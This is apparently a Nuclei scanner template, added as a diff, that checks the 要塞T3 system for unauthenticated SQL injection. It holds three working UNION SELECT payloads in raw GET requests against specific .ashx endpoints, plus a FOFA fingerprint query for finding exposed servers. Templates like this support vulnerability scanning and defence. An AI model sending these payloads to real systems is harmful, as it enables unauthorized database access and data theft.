@@ -1,0 +1,60 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - value='Microsoft SQL Server
+            - Microsoft Corporation
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /T3/Ajax/Ajax_CheckMobileRepeat.ashx?action=checkmobilerepeat&mobileNum=1%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - Microsoft SQL Server
+            - Microsoft Corporation
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /frame/CommonHomeIndex.ashx?action=getdeptpersonList&Id=%27%20UNION%20ALL%20SELECT%20NULL%2C%40%40version%2CNULL%2CNULL%2CNULL-- HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - value='Microsoft SQL Server
+            - Microsoft Corporation
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /T3/Ajax/Ajax_getddlb.ashx?typecode=11%27%20UNION%20ALL%20SELECT%20NULL%2C%28SELECT%20%40%40version%29--%20aEdt HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+id: yaosaiT3-sql
+info:
+    author: Superhero
+    description: |-
+        fofa: body="/mlogin.htm?url=" || body="T3/MAIN/Login.aspx"
+        要塞T3 多个接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 SQL 注入漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。
+    name: 要塞T3 多个接口存在SQL注入漏洞
+    reference:
+        - https://mp.weixin.qq.com/s/DYn4SXLPwXI-MxZCgQYt7A
+    severity: high
+    tags: []
